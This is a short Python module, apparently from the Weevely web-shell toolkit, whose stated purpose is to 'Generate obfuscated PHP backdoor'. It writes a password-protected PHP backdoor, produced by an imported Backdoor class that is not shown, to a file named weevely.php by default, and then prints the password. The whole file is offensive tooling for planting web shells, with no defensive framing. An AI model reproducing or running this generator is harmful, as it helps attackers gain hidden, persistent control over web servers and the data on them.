from core.parameters import ParametersList, Parameter as P
from core.module import Module, ModuleException
from core.backdoor import Backdoor


classname = 'Php'

class Php(Module):

    params = ParametersList('Generate obfuscated PHP backdoor', [],
                        P(arg='path', help='Path', default='weevely.php', pos=0))


    def __init__( self, modhandler , url, password):
        """ Avoid to load default interpreter """
        self.backdoor = Backdoor(password)
        self.modhandler = modhandler
        self.modhandler.interpreter = True
        self.password = password
        self.name = self.__module__[8:]

    def run_module( self, filename ):
        out = file( filename, 'wt' )
        out.write( self.backdoor.backdoor )
        out.close()

        self.mprint("[%s] Backdoor file '%s' created with password '%s'." % ( self.name, filename, self.password ))